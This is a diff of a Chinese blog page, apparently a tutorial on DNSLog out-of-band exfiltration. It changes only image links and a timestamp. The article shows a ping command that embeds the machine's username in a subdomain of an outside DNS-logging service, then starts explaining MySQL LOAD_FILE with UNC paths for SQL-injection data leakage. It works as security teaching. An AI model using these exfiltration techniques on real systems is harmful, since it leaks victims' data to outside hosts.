@@ -13,7 +13,7 @@
 <meta property="og:site_name" content="Reweber">
 <meta property="og:description" content="本文来源于自己之前的博客园文章 一.什么是DNSLogDNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器下">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/evdasqwe/evdasqwe.github.io/main/images/1.png">
+<meta property="og:image" content="https://s2.loli.net/2024/01/02/naKmI3WFfE4qeO2.png">
 <meta property="og:image" content="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130204345918-1416202281.png">
 <meta property="og:image" content="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130204517971-1383699345.png">
 <meta property="og:image" content="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130204845864-979192371.png">
@@ -30,11 +30,11 @@
 <meta property="og:image" content="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130221536532-67099477.png">
 <meta property="og:image" content="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130221717918-763847695.png">
 <meta property="article:published_time" content="2023-11-02T13:44:25.000Z">
-<meta property="article:modified_time" content="2024-01-02T15:40:09.636Z">
+<meta property="article:modified_time" content="2024-01-02T15:55:02.201Z">
 <meta property="article:author" content="Reweber">
 <meta property="article:tag" content="Web漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/evdasqwe/evdasqwe.github.io/main/images/1.png">
+<meta name="twitter:image" content="https://s2.loli.net/2024/01/02/naKmI3WFfE4qeO2.png">
     
     
       
@@ -176,7 +176,7 @@
 
   <div class="content e-content" itemprop="articleBody">
     <p>本文来源于自己之前的博客园文章</p>
-<h3 id="一-什么是DNSLog"><a href="#一-什么是DNSLog" class="headerlink" title="一.什么是DNSLog"></a>一.什么是DNSLog</h3><p>DNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器<br><br>下图就是注册之后的，首先需要得到这个Identifier<br><img src="https://raw.githubusercontent.com/evdasqwe/evdasqwe.github.io/main/images/1.png" alt="1" title="1"><br>然后我在本机上ping一下这个Identifier<br><img src="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130204345918-1416202281.png" alt="2"><br>然后在ceye平台上就会有一个对应的记录<br><img src="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130204517971-1383699345.png" alt="3"></p>
+<h3 id="一-什么是DNSLog"><a href="#一-什么是DNSLog" class="headerlink" title="一.什么是DNSLog"></a>一.什么是DNSLog</h3><p>DNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器<br><br>下图就是注册之后的，首先需要得到这个Identifier<br><img src="https://s2.loli.net/2024/01/02/naKmI3WFfE4qeO2.png" alt="1.png"><br>然后我在本机上ping一下这个Identifier<br><img src="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130204345918-1416202281.png" alt="2"><br>然后在ceye平台上就会有一个对应的记录<br><img src="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130204517971-1383699345.png" alt="3"></p>
 <h3 id="二-如何利用DNSLog"><a href="#二-如何利用DNSLog" class="headerlink" title="二.如何利用DNSLog"></a>二.如何利用DNSLog</h3><p>在ping 这个地址的时候，是可以变为多级的，比如一开始是 ping xxx.ceye.io ，但是我可以这样<br>ping %username%.xxx.ceye.io<br><img src="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130204845864-979192371.png" alt="4"><br>这样，平台产生的记录，就会得到你当前计算机的用户名(我这里遮掉了)<br><img src="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130204932586-1721007389.png" alt="5"><br>那么，同样的道理，我如果这里放一个sql语句，是不是也会执行呢?<br>再补充一个内容，叫UNC，它是windows上面共享资源地址的格式，比如你分享一个文件出去，然后就会产生一个访问这个文件的地址，这个就是UNC的路径，可以理解为UNC就是访问共享资源地址的格式<br>那这个DNSLog和数据库(这里以MYSQL为列)会有什么关联呢？<br>MYSQL里面有一个文件读写的函数，LOAD_FILE(文件路径)</p>
 <p>如何利用这个函数呢？<br>1.需要在mysql的my.ini文件里面配置参数 secure_file_priv<br>在[mysqld]下面配置，配置完了之后需要重启mysql，管理员身份执行 net stop mysql 再net start mysql<br><img src="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130214436276-1158498798.png" alt="6"><br>然后再查询看看是否真的打开了 命令 show variables like ‘%secure_file_priv%’，如下图，是打开了的<br><img src="https://img2023.cnblogs.com/blog/2562560/202211/2562560-20221130214652068-1618423395.png" alt="7"></p>
 <p>2.有了读写权限之后，这个读写函数，只能读取本机的文件，并且读取的字节数要小于max_allowed_packet</p>
